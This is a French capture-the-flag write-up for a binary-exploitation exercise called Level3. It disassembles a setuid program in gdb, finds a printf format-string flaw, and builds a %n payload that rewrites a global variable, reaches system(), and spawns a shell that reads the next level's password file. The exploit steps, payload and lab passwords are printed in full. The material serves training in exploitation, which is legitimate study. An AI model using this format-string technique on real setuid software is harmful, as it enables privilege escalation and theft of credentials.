# Level3

> login:password -> *`level3:492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`*
```
:~$ su level3
Password:492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
---

```
:~$ pwd
/home/user/level3
```

```
:~$ ls -la
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level3
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level3` :

```
:~$ ./level3
(input) test
test

:~$ ./level3 test
(input) test
test
```

Avec ou sans paramètre, le binaire attends un input

```
:~$ gdb level3
...

(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.

(gdb) disas v
Dump of assembler code for function v:
   (...)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   (...)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   (...)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   (...)
```

On remarque que le main du binaire appel une fonction `v()` (+6) et que cette derniere appelle plusieurs fonctions dont une fonction `printf()` (+49) vulnerable a exploit par format de chaine de caracteres.

On voit aussi la comparaison `cmp` (+59) de `64` d'une variable globale `0x804988c` (+54), puis si la comparaison passe l'execution de `fwrite()`, mais surtout de `system()`. Afin de passer la condition, il faut determiner la valeur de cette variable.

```
(gdb) info variables
All defined variables:

Non-debugging symbols:
(...)
0x0804988c  m
```

Le nom de la variable c'est `m`, on va donc faire en sorte d'utiliser la vulnerabilite de `printf()` pour en trouver sa valeur avec plusieurs `%x` qui affichera directement l'adresse.

```
:~$ echo "%x %x %x %x %x %x" | ./level3
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520
```

On va lui ajouter un simple buffer `aaaa` pour voir ou en est ecrit l'adresse, pour ensuite y imprimer l'adresse de notre variable m: `\x8c\x98\x04\x08`

```
:~$ echo "aaaa %x %x %x %x %x %x" | ./level3
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825

:~$ python -c "print '\x8c\x98\x04\x08' + '%x %x %x %x'" | ./level3
�200 b7fd1ac0 b7ff37d0 804988c
```

On a reperer notre buffer en 4e position. A present, on peux utiliser a present un `%n` pour ecrire a l'adresse de notre variable pour en changer sa valeur. L'adresse de `m` est de **4 bytes**, on doit donc ajouter **60 bytes** pour arriver au **64**

```
:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
```

C'est une reussite, on atteint le fwrite qui semble nous afficher `Wait what?!` et donc on peux a present utiliser la fonction `system()`

```
:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/level3

:~$ cat /tmp/level3 - | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

